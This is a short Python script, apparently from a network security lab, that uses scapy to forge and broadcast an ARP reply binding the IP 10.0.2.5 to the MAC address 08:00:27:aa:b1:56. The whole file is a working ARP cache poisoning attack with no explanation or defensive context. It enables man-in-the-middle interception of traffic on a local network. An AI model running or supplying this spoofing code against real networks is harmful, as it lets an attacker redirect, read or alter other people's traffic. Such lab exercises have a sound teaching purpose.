from scapy.all import *

B_ip = "10.0.2.5"
M_mac = "08:00:27:aa:b1:56"

E_layer = Ether(dst="ff:ff:ff:ff:ff:ff", src=M_mac)
A_layer = ARP(hwsrc=M_mac, psrc=B_ip, hwdst="ff:ff:ff:ff:ff:ff", pdst=B_ip, op=2)
pkt = E_layer / A_layer

sendp(pkt)
